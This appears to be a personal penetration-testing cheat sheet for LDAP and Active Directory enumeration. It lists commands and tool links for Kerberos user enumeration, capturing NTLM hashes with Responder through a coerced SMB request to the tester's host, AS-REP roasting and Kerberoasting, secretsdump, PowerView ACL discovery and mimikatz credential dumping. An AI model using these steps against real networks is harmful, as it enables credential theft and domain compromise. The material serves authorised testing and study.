# ldap - Enumeration

## When we dont have anything

### Sync time with kerberos

To figure out the difference in time with the kerberos server:

   sudo ntpdate 10.129.127.130

To simulate the difference in time when executing a command:

   faketime -f '+7h' <command>

### Use ldapdomaindump

https://github.com/Andre92Marcos/tools/tree/master/ldapDomainDump

### Use netexec

https://github.com/Andre92Marcos/tools/blob/master/netexec/README.md#ldap

## When we have a domain username, no password, no access to target

Enumerate users found to see if they pre authenticate to kerberos

   kerbrute userenum --dc <ip_to_domain_controller> -d <full_domain_name> <filename_with_usernames>

If we can make the target make a smb request back to us

   For example using sqlinjection, we can use responder to get hash and try to crack it
   https://github.com/Andre92Marcos/tools/tree/master/responder

Use bloodhound

   https://github.com/Andre92Marcos/tools/tree/master/bloodhound

## When we have a domain username, but no password, but we have access to target

Do a gci request to get the user hash (and use it in other protocols, and try to crack it), with responder running

   gci \\<mylocalhostip>\share\file #share and file dont have to exist

Run impacket-GetNPUsers

   https://github.com/Andre92Marcos/tools/blob/master/impacket/getNPUsers.md

Run impacket-GetUsersSPNsA

   https://github.com/Andre92Marcos/tools/blob/master/impacket/getUserSPNs.md

Use bloodhound

   https://github.com/Andre92Marcos/tools/tree/master/bloodhound


If our user have some special permissions run secretdump

   https://github.com/Andre92Marcos/tools/blob/master/impacket/secretdump.md


Use the snaffler tool


If we are not finding anythin with bloodhound

   Load powesploit PowerView.ps1 from:

      https://github.com/PowerShellMafia/PowerSploit/tree/dev

   And then run 

      Find-InterestingDomainAcl -ResolveGUIDS | ConvertTo-Json

   This might find relations that bloodhound missed

## When have a local Admin or domain Admin

Use mimikatz tool. (Also if we have user with SeDebugPrivilege)

   https://github.com/Andre92Marcos/tools/tree/master/mimikatz